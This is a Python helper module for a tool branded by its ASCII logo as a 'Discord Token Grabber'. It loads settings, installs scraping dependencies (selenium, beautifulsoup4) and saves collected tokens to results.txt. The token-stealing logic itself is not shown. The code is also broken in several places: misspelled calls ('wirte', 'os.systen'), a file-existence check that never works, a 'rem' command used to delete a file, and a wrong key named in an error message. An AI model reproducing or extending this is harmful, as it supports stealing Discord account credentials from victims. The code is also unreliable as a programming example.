import os
import platform
import json
import time
from datetime import datetime


class OSdiff:
    if platform.system().lower().startswith('win'):
        pip = "pip"
        python = "py"
        clear = "cls"
        windows = True
    else:
        pip = "pip3"
        python = "python3"
        clear = "clear"
        linux = True


class Config:
    with open("dtg/config.json", "r", encoding="utf-8") as conf:
        data = json.loads(conf.read())

    try:
        CLI_SLEEP_TIME = int(data["CLI_SLEEP_TIME"])
    except:
        CLI_SLEEP_TIME = 5
        print("- Please enter a valid value for CLI_SLEEP_TIME in dtg/config.json\n- Defaulting to 5")

    try:
        DISCORD_WAIT_TIME = int(data["DISCORD_WAIT_TIME"])
    except:
        DISCORD_WAIT_TIME = 5
        print("- Please enter a valid value for CLI_SLEEP_TIME in dtg/config.json\n- Defaulting to 5")

    if str(data["SAVE_TO_FILE"]).lower().startswith("y"):
        SAVE_TO_FILE = True
    else:
        SAVE_TO_FILE = False


def pasue_before_destroy_cli():
    time.sleep(Config.CLI_SLEEP_TIME)


def save_results_to_file(result: str = None):
    if result is None:
        print("- Result not given!")

    if "results.txt" in os.listdir(os.getcwd()) == False:
        with open("results.txt", "a", encoding="utf-8") as filem:
            filem.wirte(f"\n{datetime.now()} - results.txt created!")
            print("+ Created: results.txt")

    with open("results.txt", "a", encoding="utf-8") as filew:
        filew.write(f"\n{result}")
        print("+ Added token to results.txt")


def clear_screen():
    if platform.system().lower().startswith('win'):
        os.system("cls")
    else:
        os.system("clear")


def show_logo():
    print("""
        ____ _____ ____ 
        |  _ \_   _/ ___|
        | | | || || |  _ 
        | |_| || || |_| |
        |____/ |_| \____|
      Discord Token Grabber
         """)


def create_requirements_file():
    with open("requirements.txt", "w") as req_file:
        req_file.write("""beautifulsoup4
selenium
pillow
lxml""")


def install_requirements_file():
    os.system(f"{OSdiff.pip} install -r requirements.txt")


def remove_requirements_file():
    try:
        os.remove("requirements.txt")
    except:
        if OSdiff.windows:
            os.system("rem /q requirements.txt")
        if OSdiff.linux:
            os.systen("rm -rf requirements.txt")
